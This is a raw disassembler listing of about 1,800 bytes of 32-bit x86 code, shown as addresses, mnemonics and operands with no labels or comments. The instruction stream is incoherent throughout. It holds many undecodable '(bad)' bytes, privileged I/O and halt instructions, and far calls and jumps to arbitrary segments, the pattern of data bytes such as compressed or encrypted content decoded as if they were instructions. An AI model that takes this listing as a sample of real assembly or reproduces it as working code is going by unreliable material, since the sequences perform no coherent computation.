  414e5b:	xchg   ebx,eax
  414e5c:	cli    
  414e5d:	sbb    al,0xba
  414e5f:	sar    esi,1
  414e61:	inc    esp
  414e62:	sbb    edi,DWORD PTR [esi]
  414e64:	bound  ebp,QWORD PTR [edx+0x46]
  414e67:	out    0x15,eax
  414e69:	data16 aaa 
  414e6b:	xor    BYTE PTR [ecx-0x39d401d7],al
  414e71:	push   ss
  414e72:	cmc    
  414e73:	stos   DWORD PTR es:[edi],eax
  414e74:	out    dx,al
  414e75:	add    BYTE PTR [esi-0x25],ah
  414e78:	div    BYTE PTR [esi+edx*2]
  414e7b:	ror    ebp,1
  414e7d:	inc    edi
  414e7e:	sub    eax,0xe8ff8c71
  414e83:	cmp    eax,DWORD PTR [edx-0x65320a93]
  414e89:	add    esi,DWORD PTR [edi-0x6b]
  414e8c:	push   ss
  414e8d:	aam    0x9c
  414e8f:	xchg   edi,eax
  414e90:	jae    0x414ed1
  414e92:	mov    bl,0x1
  414e94:	pop    ebp
  414e95:	fistp  QWORD PTR [ebx+0x3bf163a5]
  414e9b:	jbe    0x414e4b
  414e9d:	mov    ch,0xf4
  414e9f:	xchg   edx,eax
  414ea0:	push   ebp
  414ea1:	adc    eax,0x69345af8
  414ea6:	push   eax
  414ea7:	push   0x22f924cb
  414eac:	(bad)  
  414eae:	mov    ebp,0x1583a8b5
  414eb3:	aas    
  414eb4:	mov    cl,0x80
  414eb6:	(bad)  
  414eb7:	data16 cmp bl,BYTE PTR [ebp+eiz*1-0x46]
  414ebc:	imul   esi,DWORD PTR [ebp+0x5a],0xfffffff3
  414ec0:	jnp    0x414eed
  414ec2:	pop    eax
  414ec3:	shl    DWORD PTR [ebx],1
  414ec5:	pop    edi
  414ec6:	sti    
  414ec7:	add    eax,0x9982b834
  414ecc:	add    al,0x81
  414ece:	push   ebx
  414ecf:	aad    0xfe
  414ed1:	mov    ds:0x39696cc8,al
  414ed6:	icebp  
  414ed7:	icebp  
  414ed8:	fmul   QWORD PTR [ebx]
  414eda:	mov    esp,0x4edb54cd
  414edf:	call   0x8736:0xa6bc
  414ee5:	iret   
  414ee6:	pop    ebp
  414ee7:	retf   
  414ee8:	xchg   ebx,eax
  414ee9:	xchg   BYTE PTR [ebx],bl
  414eeb:	pop    esi
  414eec:	mov    WORD PTR [eax-0x780a55b1],?
  414ef2:	ret    0x16e4
  414ef5:	mov    bl,0x0
  414ef7:	mov    ds,WORD PTR [ecx-0xf]
  414efa:	push   ebx
  414efb:	pop    esp
  414efc:	xchg   edi,eax
  414efd:	out    0x33,al
  414eff:	mov    ds:0xb411b980,eax
  414f04:	pop    es
  414f05:	fst    QWORD PTR [edi-0x50b94c71]
  414f0b:	pop    ecx
  414f0c:	out    dx,eax
  414f0d:	inc    edx
  414f0e:	idiv   BYTE PTR [ebp+ebp*4+0x7b]
  414f12:	xchg   esi,eax
  414f13:	out    dx,eax
  414f14:	xchg   esi,eax
  414f15:	and    BYTE PTR [ecx-0x7f55c1ba],bl
  414f1b:	and    DWORD PTR [edi],edx
  414f1d:	aad    0xbd
  414f1f:	cdq    
  414f20:	add    DWORD PTR [ecx],eax
  414f22:	add    al,0xfd
  414f24:	inc    eax
  414f25:	xchg   edi,eax
  414f26:	jb     0x414f1b
  414f28:	adc    BYTE PTR [eax-0x57],al
  414f2b:	push   es
  414f2c:	or     BYTE PTR [ecx+eax*8+0x2],0x8
  414f31:	jecxz  0x414f81
  414f33:	les    ecx,FWORD PTR [edi+0x9]
  414f36:	in     al,dx
  414f37:	or     BYTE PTR [ebx+ebp*8+0x5],cl
  414f3b:	jmp    0xa022:0xf5a36226
  414f42:	jb     0x414f0a
  414f44:	xor    BYTE PTR [esi*8-0x797fad2c],ah
  414f4b:	ss repz jno 0x414fa4
  414f4f:	icebp  
  414f50:	xchg   esp,eax
  414f51:	outs   dx,BYTE PTR ds:[esi]
  414f52:	and    edx,edi
  414f54:	and    eax,0x8d0243da
  414f59:	call   0x331791dc
  414f5e:	mov    dl,0x54
  414f60:	cmp    eax,0x95f6826d
  414f65:	mov    esi,0x53c8b4ff
  414f6a:	mov    bh,0xf2
  414f6c:	mov    bl,0x11
  414f6e:	cmc    
  414f6f:	jae    0x414f87
  414f71:	mov    ebp,0x4522932e
  414f76:	and    BYTE PTR [edx+0x589f53a2],0x8d
  414f7d:	cmp    bh,BYTE PTR ds:[ebp+eax*1+0x64]
  414f82:	mov    edx,0xca2aae2c
  414f87:	je     0x414faa
  414f89:	mov    ecx,0x73c72fb6
  414f8e:	cmp    bh,BYTE PTR [ecx]
  414f90:	dec    esp
  414f91:	cmp    al,0x55
  414f93:	mov    al,0x38
  414f95:	test   al,0x6
  414f97:	call   0xab7b:0x1d3d3288
  414f9e:	shl    ebp,1
  414fa0:	pop    ds
  414fa1:	xlat   BYTE PTR ds:[ebx]
  414fa2:	jnp    0x414f52
  414fa4:	test   DWORD PTR [esi+0x21],ebx
  414fa7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414fa8:	arpl   bx,ax
  414faa:	mov    dh,BYTE PTR [ebx]
  414fac:	test   al,0x90
  414fae:	pop    ss
  414faf:	cmp    DWORD PTR [esi],edx
  414fb1:	fwait
  414fb2:	adc    eax,ebx
  414fb4:	js     0x414f88
  414fb6:	adc    BYTE PTR [ecx+ebp*2-0x37],bl
  414fba:	test   eax,0x4a266717
  414fbf:	adc    al,0xa2
  414fc1:	je     0x414fe6
  414fc3:	or     esp,DWORD PTR [edi+0x26762562]
  414fc9:	sbb    esp,DWORD PTR [esi-0x64d34853]
  414fcf:	adc    al,0xe4
  414fd1:	hlt    
  414fd2:	arpl   WORD PTR [ecx],bp
  414fd4:	ds je  0x414ffc
  414fd7:	push   ss
  414fd8:	xor    eax,0xd36520d3
  414fdd:	mov    DWORD PTR [eax+0x2],esp
  414fe0:	sbb    ch,bh
  414fe2:	(bad)  
  414fe3:	pushf  
  414fe4:	pop    eax
  414fe5:	xchg   ebx,eax
  414fe6:	mov    esi,0x6c883ccf
  414feb:	sbb    ecx,edi
  414fed:	adc    al,0x41
  414fef:	inc    ecx
  414ff0:	outs   dx,DWORD PTR ds:[esi]
  414ff1:	loope  0x414f9c
  414ff3:	mov    ebp,0x5d35365b
  414ff8:	mov    bl,0xe8
  414ffa:	hlt    
  414ffb:	jmp    0x415040
  414ffd:	xchg   esp,edx
  414fff:	jbe    0x414fc7
  415001:	adc    eax,0x78e7ec55
  415006:	mov    ch,0xb0
  415008:	out    dx,eax
  415009:	inc    eax
  41500a:	jb     0x415069
  41500c:	mov    ecx,0xe00016d7
  415011:	fs ret 0xc9a7
  415015:	scas   al,BYTE PTR es:[edi]
  415016:	in     eax,0x9
  415018:	jecxz  0x415079
  41501a:	sti    
  41501b:	mul    BYTE PTR [esi-0x70]
  41501e:	xor    esi,edx
  415020:	cmp    eax,0x4f4baddc
  415025:	adc    eax,DWORD PTR [edi+0x3d]
  415028:	imul   esp,esp,0x3cce0d7a
  41502e:	stc    
  41502f:	test   DWORD PTR [eax+0x23],edx
  415032:	out    dx,al
  415033:	jg     0x415034
  415035:	push   esi
  415036:	jmp    0x688c983f
  41503b:	xchg   esi,eax
  41503c:	test   al,0xe5
  41503e:	add    DWORD PTR [ecx-0x30],ecx
  415041:	dec    edi
  415042:	mov    ah,0xeb
  415044:	cmp    BYTE PTR [eax],ch
  415046:	add    bl,dl
  415048:	jl     0x415089
  41504a:	imul   edx,DWORD PTR [eax-0xa],0xe
  41504e:	mov    bl,0xf9
  415050:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415051:	inc    ebx
  415052:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415053:	xchg   esp,eax
  415054:	imul   edx,DWORD PTR [edi-0x6ae869ab],0xffffffe9
  41505b:	push   ecx
  41505c:	add    ebp,DWORD PTR [ebx-0x38]
  41505f:	imul   eax
  415061:	jle    0x415088
  415063:	mov    ch,0x94
  415065:	sbb    BYTE PTR [ebx],bl
  415067:	push   eax
  415068:	cmp    edx,0x3
  41506b:	fwait
  41506c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41506d:	ror    DWORD PTR [bx+di+0x3573],0x92
  415073:	scas   eax,DWORD PTR es:[edi]
  415074:	(bad)  
  415075:	shl    BYTE PTR [ebx+0x31],1
  415078:	fcom   QWORD PTR [ecx+0x611348e5]
  41507e:	mov    dl,BYTE PTR [ecx]
  415080:	xchg   esp,eax
  415081:	das    
  415082:	popa   
  415083:	jmp    0xcde804a5
  415088:	xchg   edx,eax
  415089:	dec    eax
  41508a:	fbstp  TBYTE PTR [eax+0xad41c00]
  415090:	sub    eax,DWORD PTR [ecx+0x54]
  415093:	gs push edi
  415095:	retf   0x1072
  415098:	cld    
  415099:	inc    edi
  41509a:	adc    dl,BYTE PTR [eax+eax*8-0x73569f0]
  4150a1:	sahf   
  4150a2:	hlt    
  4150a3:	ret    0xa9ff
  4150a6:	mov    bl,0xd4
  4150a8:	pop    ebx
  4150a9:	iret   
  4150aa:	dec    ebx
  4150ab:	xchg   esi,eax
  4150ac:	ds add esp,esi
  4150af:	lods   eax,DWORD PTR ds:[esi]
  4150b0:	xchg   ecx,eax
  4150b1:	pop    edi
  4150b2:	dec    edi
  4150b3:	call   0xfc0:0x9ffb930c
  4150ba:	or     esp,DWORD PTR [ebx-0x11]
  4150bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4150be:	sub    DWORD PTR [edx+ebp*2-0x7b],0xa9dd6000
  4150c6:	pusha  
  4150c7:	push   0xd7ecda08
  4150cc:	das    
  4150cd:	cmp    bl,dh
  4150cf:	cmp    al,BYTE PTR [ecx]
  4150d1:	inc    esi
  4150d2:	sbb    esp,DWORD PTR [eax-0x5a]
  4150d5:	and    DWORD PTR [ebp+edx*2-0xf71cfaf],ecx
  4150dc:	mov    ch,0x81
  4150de:	cwde   
  4150df:	sub    al,0x3e
  4150e1:	and    al,0x54
  4150e3:	inc    edi
  4150e4:	scas   al,BYTE PTR es:[edi]
  4150e5:	xor    dl,BYTE PTR [edx-0x40]
  4150e8:	sti    
  4150e9:	hlt    
  4150ea:	arpl   WORD PTR [edx],cx
  4150ec:	lods   eax,DWORD PTR ds:[esi]
  4150ed:	push   ss
  4150ee:	mov    ch,al
  4150f0:	add    ebp,DWORD PTR [edi+0x5efecf1]
  4150f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4150f7:	add    al,0xde
  4150f9:	jne    0x41517a
  4150fb:	sbb    eax,0xd98b1a92
  415100:	mov    ecx,eax
  415102:	cdq    
  415103:	test   DWORD PTR [eax-0x7],ebx
  415106:	push   ebp
  415107:	retf   
  415108:	lahf   
  415109:	sub    DWORD PTR [ecx],ecx
  41510b:	test   al,0x29
  41510d:	and    dh,BYTE PTR [edx+0x6f1a1b87]
  415113:	ss inc ebx
  415115:	and    al,0x49
  415117:	push   cs
  415118:	xor    cl,0x43
  41511b:	ins    BYTE PTR es:[edi],dx
  41511c:	inc    DWORD PTR [eax-0x4af8802a]
  415122:	loope  0x41512b
  415124:	and    al,0xb6
  415126:	test   DWORD PTR [ecx+0x31a14cb],ecx
  41512c:	call   0xe243:0x149a39a
  415133:	jecxz  0x415120
  415135:	add    DWORD PTR ds:0xa7e61d8e,ebx
  41513b:	addr16 mov dl,0x74
  41513e:	call   0xefe1:0xe8bf4ccb
  415145:	mov    eax,0x50a683a8
  41514a:	ds in  eax,dx
  41514c:	push   esp
  41514d:	test   eax,0xadec625f
  415152:	push   ds
  415153:	stc    
  415154:	js     0x4150f4
  415156:	popf   
  415157:	mov    bl,0x71
  415159:	sub    ch,BYTE PTR [eax+eax*8]
  41515c:	in     eax,0xf1
  41515e:	push   ecx
  41515f:	lds    edx,FWORD PTR [eax-0x15]
  415162:	outs   dx,DWORD PTR ds:[esi]
  415163:	jp     0x415167
  415165:	sbb    dh,BYTE PTR [ebx]
  415167:	fs jmp 0xd76c:0x62c2b5c7
  41516f:	dec    ecx
  415170:	pop    esi
  415171:	fdiv   st(3),st
  415173:	xchg   edi,eax
  415174:	sub    al,0x23
  415176:	mov    edi,0x8a1de670
  41517b:	(bad)  
  41517c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41517d:	into   
  41517e:	bnd jno 0x415166
  415181:	push   ecx
  415182:	xor    al,0x63
  415184:	mov    fs,WORD PTR [ebx+0x9]
  415187:	add    eax,0xf0babc5b
  41518c:	push   ebp
  41518d:	pop    edi
  41518e:	imul   ebx,DWORD PTR [eax-0x6d],0x416952f3
  415195:	xor    bl,BYTE PTR [eax-0x3dbe0b90]
  41519b:	(bad)  
  41519c:	xlat   BYTE PTR ds:[ebx]
  41519d:	cmp    dx,WORD PTR [edi]
  4151a0:	xchg   BYTE PTR [esi],bl
  4151a2:	xchg   ecx,eax
  4151a3:	jbe    0x4151fc
  4151a5:	add    esi,DWORD PTR [eax-0x38b35dd6]
  4151ab:	mov    esp,0xf93fe7
  4151b0:	xor    eax,0x1a30fe96
  4151b5:	or     al,0x82
  4151b7:	xor    al,ch
  4151b9:	addr16 xchg cl,ch
  4151bc:	shl    BYTE PTR [esi+0x5e],1
  4151bf:	or     BYTE PTR [eax+0x29],bh
  4151c2:	and    al,0x86
  4151c4:	fcomp  QWORD PTR [eax-0x42]
  4151c7:	popf   
  4151c8:	mov    edx,0x223b0640
  4151cd:	cmc    
  4151ce:	dec    esp
  4151cf:	popf   
  4151d0:	pop    edi
  4151d1:	aam    0xc3
  4151d3:	retf   
  4151d4:	xchg   edx,eax
  4151d5:	gs addr16 mov esp,0x28462f02
  4151dc:	jno    0x41523c
  4151de:	sbb    edi,DWORD PTR [eax-0xf8acc46]
  4151e4:	mov    al,ds:0xc4218117
  4151e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4151ea:	addr16 adc al,0xec
  4151ed:	mov    ah,0xf4
  4151ef:	fs mov bh,0xdb
  4151f2:	sbb    eax,0x784a26a
  4151f7:	stc    
  4151f8:	(bad)  
  4151fa:	xor    eax,0xc375b512
  4151ff:	mov    ecx,ebp
  415201:	popf   
  415202:	fistp  QWORD PTR [edx]
  415204:	inc    edi
  415205:	sbb    al,0x92
  415207:	mov    ah,0x94
  415209:	ret    0x7661
  41520c:	iret   
  41520d:	push   cs
  41520e:	mov    ecx,0xaf8c0dab
  415213:	dec    edx
  415214:	jp     0x415280
  415216:	(bad)  
  415217:	sub    eax,0x27b4ccaf
  41521c:	sar    BYTE PTR [ebx-0x3a],0x8f
  415220:	stos   DWORD PTR es:[edi],eax
  415221:	clc    
  415222:	es scas al,BYTE PTR es:[di]
  415225:	mov    WORD PTR [ebx-0x5],es
  415228:	enter  0x7851,0x3d
  41522c:	add    ch,ch
  41522e:	mov    DWORD PTR [ebx+0x4b],ebx
  415231:	gs mov esp,0xb1e2c6fa
  415237:	xor    edx,DWORD PTR [ebx-0x34]
  41523a:	rcl    ah,1
  41523c:	iret   
  41523d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41523e:	nop
  41523f:	clc    
  415240:	push   edi
  415241:	push   ebx
  415242:	add    ch,BYTE PTR [esp+eax*1-0x37]
  415246:	repnz sub eax,0xaaae133e
  41524c:	aaa    
  41524d:	xor    bh,bh
  41524f:	cmp    al,0x43
  415251:	jp     0x41521a
  415253:	pop    ebp
  415254:	pop    ebp
  415255:	out    dx,eax
  415256:	cmp    al,bl
  415258:	jp     0x415268
  41525a:	push   esp
  41525b:	xor    DWORD PTR [eax],edx
  41525d:	dec    ebp
  41525e:	xchg   ecx,eax
  41525f:	ins    DWORD PTR es:[edi],dx
  415260:	ins    BYTE PTR es:[edi],dx
  415261:	push   es
  415262:	pop    edi
  415263:	js     0x4152c9
  415265:	xor    eax,0xc61da317
  41526a:	push   0x6fa61b9f
  41526f:	stc    
  415270:	add    esp,eax
  415272:	fild   WORD PTR [ecx+0x5f965cef]
  415278:	push   eax
  415279:	sbb    eax,0xf617f706
  41527e:	ins    BYTE PTR es:[edi],dx
  41527f:	daa    
  415280:	lds    esp,FWORD PTR [esi-0x63953a9a]
  415286:	jp     0x4152d2
  415288:	cmp    bl,BYTE PTR es:[ebx]
  41528b:	sti    
  41528c:	pop    es
  41528d:	dec    ebp
  41528e:	pop    ss
  41528f:	repz mov ds:0x4605ec60,eax
  415295:	ja     0x4152f1
  415297:	leave  
  415298:	mov    eax,ds:0xbe322187
  41529d:	fs xchg ebp,eax
  41529f:	in     eax,dx
  4152a0:	mov    eax,0x8318d4c8
  4152a5:	sub    esi,edx
  4152a7:	test   DWORD PTR [ecx],esi
  4152a9:	pop    ds
  4152aa:	fild   QWORD PTR [edx]
  4152ac:	jns    0x41526a
  4152ae:	push   edx
  4152af:	(bad)  
  4152b0:	arpl   WORD PTR [ebx+0x1d607f39],di
  4152b6:	scas   al,BYTE PTR es:[edi]
  4152b7:	data16 mov al,0x71
  4152ba:	mov    esi,DWORD PTR [ecx+0x53]
  4152bd:	push   0x9295126
  4152c2:	mov    eax,0x5b2e13b6
  4152c7:	sub    DWORD PTR [edx+esi*2-0x6b],esi
  4152cb:	add    eax,0xb32d2030
  4152d0:	pop    edi
  4152d1:	cmp    al,0x54
  4152d3:	pop    ds
  4152d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4152d5:	clc    
  4152d6:	xchg   ah,bh
  4152d8:	rcl    ch,1
  4152da:	ja     0x415264
  4152dc:	cs call 0x4a0c:0xd85d3ca9
  4152e4:	int    0x38
  4152e6:	fst    DWORD PTR [esi]
  4152e8:	imul   esp,ecx,0xe8f1c89f
  4152ee:	adc    ah,BYTE PTR [eax+0x33647a3e]
  4152f4:	dec    esi
  4152f5:	cli    
  4152f6:	xchg   ecx,eax
  4152f7:	add    bh,al
  4152f9:	jle    0x41530b
  4152fb:	aaa    
  4152fc:	sbb    BYTE PTR [ecx-0x7],cl
  4152ff:	dec    ebp
  415300:	ds fxch st(5)
  415303:	out    0xd6,al
  415305:	or     al,0x62
  415307:	mov    eax,0xa84c44b8
  41530c:	xchg   ecx,eax
  41530d:	and    DWORD PTR [eax-0x58],eax
  415310:	and    edx,DWORD PTR [esi-0x2aef3546]
  415316:	sbb    DWORD PTR [ebx+0x1e],edi
  415319:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41531a:	popa   
  41531b:	ret    0xfa65
  41531e:	cmp    ah,BYTE PTR [esi]
  415320:	pop    edx
  415321:	pop    esp
  415322:	or     BYTE PTR [ebp-0x6c0670b4],0xe2
  415329:	das    
  41532a:	add    eax,0x408e7d89
  41532f:	or     al,0x42
  415331:	mov    edi,0xbf3b4019
  415336:	sbb    eax,0xdfd02bf5
  41533b:	daa    
  41533c:	aad    0xd2
  41533e:	adc    DWORD PTR [edi-0xe639987],esp
  415344:	cmp    eax,0x2b1214ce
  415349:	and    eax,0xa74c0e8e
  41534e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41534f:	rcl    DWORD PTR [edx-0x37ab5b7f],0x21
  415356:	test   al,0x4b
  415358:	pop    edi
  415359:	test   eax,eax
  41535b:	xchg   ecx,eax
  41535c:	push   edi
  41535d:	mov    esi,0x15efb3aa
  415362:	push   es
  415363:	int    0xaa
  415365:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  415367:	mov    ?,WORD PTR [edi]
  415369:	ror    DWORD PTR [esi],cl
  41536b:	xchg   edx,eax
  41536c:	jo     0x4153e7
  41536e:	out    0xc9,eax
  415370:	mov    eax,ebx
  415372:	jns    0x415316
  415374:	ret    
  415375:	out    dx,al
  415376:	jo     0x4153bc
  415378:	push   edx
  415379:	xchg   ebp,eax
  41537a:	and    BYTE PTR [ebp-0x311d8cc],0x7
  415381:	fld    DWORD PTR [ebp-0x62]
  415384:	push   cs
  415385:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  415387:	or     esp,ecx
  415389:	jno    0x415319
  41538b:	add    al,0x61
  41538d:	mov    DWORD PTR [esi],ebp
  41538f:	sbb    dh,bh
  415391:	cmp    al,0x41
  415393:	add    edx,DWORD PTR [ebx]
  415395:	xchg   esi,eax
  415396:	add    ah,BYTE PTR [ecx]
  415398:	(bad)  
  415399:	int    0x68
  41539b:	adc    BYTE PTR [esi-0x7c61cf8f],cl
  4153a1:	mov    ds:0xdb92e9fe,eax
  4153a6:	push   ecx
  4153a7:	nop
  4153a8:	pop    ds
  4153a9:	adc    bl,BYTE PTR [eax]
  4153ab:	(bad)  
  4153ac:	pop    ebx
  4153ad:	adc    esi,DWORD PTR [ecx-0x34944ca8]
  4153b3:	pop    edi
  4153b4:	and    ah,BYTE PTR [ebp+0x1e]
  4153b7:	mov    ecx,0xb69cb125
  4153bc:	ss xor esi,edx
  4153bf:	sbb    al,BYTE PTR [edi+ebp*2-0x6330c2d0]
  4153c6:	(bad)  
  4153c7:	jmp    0xb451:0x5d6f6184
  4153ce:	outs   dx,DWORD PTR ds:[esi]
  4153cf:	repnz xchg ecx,eax
  4153d1:	pusha  
  4153d2:	rcl    DWORD PTR [esi+eax*8+0x760bc1c0],0x7e
  4153da:	imul   DWORD PTR [ecx+0x4722a91d]
  4153e0:	aad    0x85
  4153e2:	cwde   
  4153e3:	(bad)  
  4153e4:	dec    eax
  4153e5:	jns    0x415458
  4153e7:	adc    bl,BYTE PTR [ebp+0x18]
  4153ea:	(bad)  
  4153eb:	pusha  
  4153ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4153ed:	iret   
  4153ee:	hlt    
  4153ef:	inc    ebp
  4153f0:	push   ecx
  4153f1:	add    esp,DWORD PTR [ebp+0xedfad58]
  4153f7:	rcr    BYTE PTR [esi+0x76],cl
  4153fa:	jo     0x415439
  4153fc:	mov    ecx,0x5bee10a3
  415401:	outs   dx,BYTE PTR ds:[esi]
  415402:	aaa    
  415403:	into   
  415404:	lods   eax,DWORD PTR ds:[esi]
  415405:	imul   esp,DWORD PTR [ebp-0x2a175ae1],0xffffffd8
  41540c:	and    eax,0x6ede8df9
  415411:	scas   al,BYTE PTR es:[edi]
  415412:	xor    DWORD PTR [esi+0x73acdf96],esi
  415418:	add    eax,0x58827fbd
  41541d:	je     0x4153d9
  41541f:	fimul  DWORD PTR [esp+ebp*1-0x72]
  415423:	das    
  415424:	push   cs
  415425:	in     al,0xbd
  415427:	test   ebx,edi
  415429:	jg     0x415495
  41542b:	(bad)  
  41542d:	jns    0x41541a
  41542f:	test   DWORD PTR [edx-0xb50780a],0xac855f4c
  415439:	out    0xdf,eax
  41543b:	gs call 0x7df9:0xbd8abcdd
  415443:	add    dh,BYTE PTR [esp+ebp*8+0x187e31a7]
  41544a:	pop    esi
  41544b:	aaa    
  41544c:	push   eax
  41544d:	sbb    DWORD PTR [ecx-0x5d],eax
  415450:	icebp  
  415451:	loope  0x415415
  415453:	data16 aad 0x5f
  415456:	mov    ah,0xa9
  415458:	les    esi,FWORD PTR [ebp+0x23]
  41545b:	mov    ch,0x8d
  41545d:	sbb    al,0x88
  41545f:	mov    bh,0xf6
  415461:	or     al,BYTE PTR [ecx-0x6]
  415464:	stos   DWORD PTR es:[edi],eax
  415465:	sbb    DWORD PTR [edi],esi
  415467:	nop
  415468:	stos   DWORD PTR es:[edi],eax
  415469:	neg    ecx
  41546b:	into   
  41546c:	int    0x6f
  41546e:	neg    esi
  415470:	xchg   edi,eax
  415471:	addr16 and eax,0x4a35bcc1
  415477:	pop    ds
  415478:	push   esi
  415479:	jmp    0xa973:0x307c2026
  415480:	popf   
  415481:	and    esp,DWORD PTR [ebp+0x70]
  415484:	xchg   BYTE PTR [esi+0x5a],bl
  415487:	xor    esp,0x4540e711
  41548d:	in     al,dx
  41548e:	ds push edi
  415490:	mov    ebx,0x58545ab1
  415495:	dec    ecx
  415496:	xor    ah,BYTE PTR [esi+edi*8]
  415499:	int    0x9
  41549b:	arpl   bx,bx
  41549d:	fnstsw ax
  41549f:	mov    esp,0xc1ee8e0
  4154a4:	and    BYTE PTR [edi+ebp*4+0x439f34b8],al
  4154ab:	mov    eax,ds:0x270c7b1a
  4154b0:	mov    ebp,DWORD PTR [ebx-0x68]
  4154b3:	or     eax,0x383fe06b
  4154b8:	icebp  
  4154b9:	ja     0x41543e
  4154bb:	dec    edi
  4154bc:	aas    
  4154bd:	lods   eax,DWORD PTR ds:[esi]
  4154be:	mov    al,0x53
  4154c0:	aas    
  4154c1:	fs push 0xbea21c16
  4154c7:	or     eax,esp
  4154c9:	cmc    
  4154ca:	lea    ebx,[ebx]
  4154cc:	inc    edi
  4154cd:	ins    BYTE PTR es:[edi],dx
  4154ce:	enter  0x6b45,0x39
  4154d2:	fadd   QWORD PTR [eax+ecx*4+0x16ee937e]
  4154d9:	arpl   WORD PTR [ebx+0x76],ax
  4154dc:	xchg   edi,eax
  4154dd:	cmc    
  4154de:	out    dx,eax
  4154df:	js     0x415542
  4154e1:	and    DWORD PTR [edx+0x788c1a02],ebx
  4154e7:	mov    esi,DWORD PTR [eax+0x5d630f5f]
  4154ed:	or     dl,BYTE PTR [ecx]
  4154ef:	out    0x95,al
  4154f1:	xor    ah,ah
  4154f3:	add    al,0x1b
  4154f5:	sbb    ebp,DWORD PTR [edi-0x40]
  4154f8:	dec    esp
  4154f9:	dec    eax
  4154fa:	prefetch BYTE PTR [eax]
  4154fd:	arpl   WORD PTR gs:[edi+eax*4+0x24c3d106],di
  415505:	push   edx
  415506:	fist   WORD PTR [ecx]
  415508:	loop   0x4154b7
  41550a:	push   ebx
  41550b:	js     0x4154a7
  41550d:	inc    ebx
  41550e:	(bad)  
  41550f:	mov    gs,ebp
  415511:	repz dec edi
  415513:	add    BYTE PTR [ecx],cl
  415515:	out    dx,eax
  415516:	sbb    eax,0xb44a5d3d
  41551b:	mov    ebp,0x6f4d3246
  415520:	jl     0x41558f
  415522:	mov    DWORD PTR [ebx],edx
  415524:	mov    ds:0x67f9e5fc,eax
  415529:	add    edi,edi
  41552b:	addr16 mov bl,0xc6
  41552e:	(bad)  
  41552f:	xchg   ecx,eax
  415530:	adc    DWORD PTR [esi-0x6a],0x4cd1ab78
  415537:	cli    
  415538:	ret    0xee21
  41553b:	xor    al,0xe9
  41553d:	shr    edi,cl
  41553f:	out    0xb1,eax
  415541:	sbb    cl,BYTE PTR [esi+0x2b]
  415544:	xchg   ebp,eax
  415545:	add    al,0x4c
  415547:	mov    ah,0xd3
  415549:	mov    ds:0x2e9f1f40,eax
  41554e:	arpl   WORD PTR [bp+si-0x51],bx
  415552:	inc    edi
  415553:	(bad)  
  415554:	sbb    ebp,DWORD PTR [esi+0x792761d9]
  41555a:	adc    eax,0x72dd5cf3
  41555f:	mov    ebx,0xaad9fbd3
  415564:	mov    ds:0x65607355,al
  415569:	and    DWORD PTR [edi],esi
  41556b:	mov    edi,0xc4c73304
  415570:	push   ds
  415571:	sub    eax,0x50ecc768
  415576:	sub    al,0xca
  415578:	add    ebp,ebx
  41557a:	mov    esi,esi
  41557c:	pop    ebx
  41557d:	mov    esp,0xcd62e100
  415582:	fwait
  415583:	cdq    
  415584:	push   edx
  415585:	std    
  415586:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415587:	cld    
  415588:	in     al,0xa9
  41558a:	call   0x8348ff1f
  41558f:	mov    al,ds:0xf45caa78
  415594:	push   edx
  415595:	call   0x9596:0xb5ccb63b
  41559c:	jns    0x4155b0
  41559e:	inc    ebp
  41559f:	sub    ecx,DWORD PTR [ecx-0x2d]
  4155a2:	sub    cl,cl
  4155a4:	scas   al,BYTE PTR es:[edi]
  4155a5:	sub    edi,ebx
  4155a7:	inc    ecx
  4155a8:	jbe    0x415567
  4155aa:	enter  0x182b,0x26
  4155ae:	ficom  WORD PTR [ebp+0x3cf1bb31]
  4155b4:	xor    BYTE PTR [edi-0x6],ah
  4155b7:	inc    esi
  4155b8:	push   cs
  4155b9:	mov    edx,0xaf63ea15
  4155be:	(bad)  
  4155c1:	aad    0xce
  4155c3:	xor    esp,esp
  4155c5:	cmc    
  4155c6:	push   eax
  4155c7:	add    eax,0xc81202b9
  4155cc:	(bad)  
  4155cd:	mov    dl,0xc1
  4155cf:	xor    eax,0xdc25928e
  4155d4:	push   ebp
  4155d5:	(bad)  
  4155d6:	ficom  WORD PTR [edi]
  4155d8:	inc    edx
  4155d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4155da:	sbb    DWORD PTR [eax],edx
  4155dc:	pop    es
  4155dd:	call   0x4211:0x4a941a48
  4155e4:	punpckhwd mm5,QWORD PTR [esi-0x7305eccd]
  4155eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4155ec:	sti    
  4155ed:	dec    edx
  4155ee:	retf   
  4155ef:	stc    
  4155f0:	add    al,0x92
  4155f2:	xor    eax,0xbe138885
  4155f7:	stos   BYTE PTR es:[edi],al
  4155f8:	fbld   TBYTE PTR [ecx+0xb]
  4155fb:	dec    eax
  4155fc:	inc    ebx
  4155fd:	adc    al,0x92
  4155ff:	ficom  WORD PTR [edx-0x2c]
  415602:	cli    
  415603:	push   es
  415604:	int3   
  415605:	cmp    edi,DWORD PTR [ebx+0x3a5029b3]
  41560b:	ss mul ebp
  41560e:	aas    
  41560f:	jge    0x415633
  415611:	xchg   ebx,eax
  415612:	les    esi,FWORD PTR [esi-0x2a9e2f5e]
  415618:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415619:	aam    0x3e
  41561b:	jb     0x41568d
  41561d:	outs   dx,BYTE PTR ds:[esi]
  41561e:	mov    dh,0x88
  415620:	pop    ebx
  415621:	push   eax
  415622:	in     eax,0xa3
  415624:	sub    al,0x96
  415626:	sub    BYTE PTR [eax+ecx*2-0x77],ah
  41562a:	popa   
